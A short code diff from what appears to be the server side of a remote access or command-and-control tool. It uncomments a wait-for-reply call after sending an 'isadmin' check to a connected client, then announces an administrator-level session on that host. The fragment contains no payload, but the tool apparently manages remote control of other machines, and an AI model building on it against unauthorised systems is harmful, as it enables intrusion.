@@ -232,7 +232,7 @@ class ClientManage:
 
         if(session):
             self.SendData("isadmin") # check admin first
-            #self.WaitForReply()
+            self.WaitForReply()
             time.sleep(2)
             if(self.elevated):
                 print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} with Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
